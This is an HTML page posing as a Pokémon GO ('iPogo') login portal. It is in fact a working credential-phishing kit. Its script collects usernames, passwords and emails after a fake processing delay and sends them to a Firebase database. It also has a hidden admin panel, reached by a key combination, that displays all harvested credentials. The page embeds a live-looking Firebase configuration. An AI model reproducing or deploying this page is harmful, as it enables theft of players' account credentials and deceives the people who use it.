<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>iPogo Login Portal</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
    .container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h2, h3 { text-align: center; color: #e3350d; }
    .form-group { margin-bottom: 20px; }
    label { display: block; margin-bottom: 5px; }
    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
    .btn { width: 100%; padding: 10px; background: #e3350d; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    .btn:hover { background: #c12a0b; }
    #emailStep, #adminPanel, #adminAccess { display: none; }
    .success-msg { text-align: center; color: green; margin-top: 15px; font-weight: bold; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
    th { background: #e3350d; color: white; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Pok√©mon GO Login</h2>

    <!-- Step 1: Username + Password -->
    <div id="loginStep">
      <div class="form-group">
        <label>Username</label>
        <input type="text" id="username" />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="password" />
      </div>
      <button class="btn" onclick="nextStep()">Next</button>
    </div>

    <!-- Step 2: Email -->
    <div id="emailStep">
      <div class="form-group">
        <label>Email</label>
        <input type="email" id="email" />
      </div>
      <button class="btn" onclick="saveCredentials()">Submit</button>
      <p class="success-msg" id="successMsg"></p>
    </div>

    <!-- Admin Access Trigger (Hidden) -->
    <div id="adminAccess">
      <label><strong>Admin Password:</strong></label>
      <input type="password" id="adminPassword" />
      <button class="btn" style="margin-top:10px" onclick="checkAdmin()">View Admin Panel</button>
    </div>

    <!-- Admin Panel -->
    <div id="adminPanel">
      <h3>Stored Credentials</h3>
      <table>
        <thead>
          <tr><th>Username</th><th>Password</th><th>Email</th><th>Time</th></tr>
        </thead>
        <tbody id="credTable"></tbody>
      </table>
      <button class="btn" style="background:#555;margin-top:20px" onclick="clearAll()">Delete All</button>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDww9woXWjws5IXsNuuedCsnL1QOnH2xII",
      authDomain: "ipogo-3d1d6.firebaseapp.com",
      databaseURL: "https://ipogo-3d1d6-default-rtdb.firebaseio.com",
      projectId: "ipogo-3d1d6",
      storageBucket: "ipogo-3d1d6.firebasestorage.app",
      messagingSenderId: "623421100612",
      appId: "1:623421100612:web:20d6602fbece9b25e8a211",
      measurementId: "G-BZCRV70CP4"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function nextStep() {
      const uname = document.getElementById('username').value;
      const pass = document.getElementById('password').value;
      if (!uname || !pass) return alert('Please enter username and password.');

      // Simulate real processing delay
      document.getElementById('loginStep').innerHTML = '<p style="text-align:center">Processing...</p>';
      setTimeout(() => {
        document.getElementById('loginStep').style.display = 'none';
        document.getElementById('emailStep').style.display = 'block';
      }, 1200);
    }

    function saveCredentials() {
      const uname = document.getElementById('username').value;
      const pass = document.getElementById('password').value;
      const email = document.getElementById('email').value;
      const time = new Date().toLocaleString();
      if (!email) return alert('Please enter your email.');

      document.getElementById('successMsg').innerText = 'Saving your info...';

      setTimeout(() => {
        db.ref('credentials').push({ uname, pass, email, time });
        document.getElementById('successMsg').innerText = 'Thank you! Your email has been submitted and credentials saved.';
      }, 1200);
    }

    function checkAdmin() {
      const pwd = prompt('Enter admin password:');
      const year = new Date().getFullYear();
      if (pwd === 'ipogo' + year + '!Secure') {
        document.getElementById('adminPanel').style.display = 'block';
        loadCredentials();
      } else {
        alert("Incorrect admin password.");
      }
    }

    function loadCredentials() {
      const table = document.getElementById('credTable');
      table.innerHTML = '';
      db.ref('credentials').once('value', snapshot => {
        snapshot.forEach(child => {
          const c = child.val();
          const row = `<tr><td>${c.uname}</td><td>${c.pass}</td><td>${c.email}</td><td>${c.time}</td></tr>`;
          table.innerHTML += row;
        });
      });
    }

    function clearAll() {
      if (confirm('Clear all saved data?')) {
        db.ref('credentials').remove().then(() => loadCredentials());
      }
    }

    // Show admin input box only for you (Ctrl + A)
    window.addEventListener('keydown', (e) => {
      if (e.ctrlKey && e.key === 'A') {
        document.getElementById('adminAccess').style.display = 'block';
      }
    });
  </script>
</body>
</html>
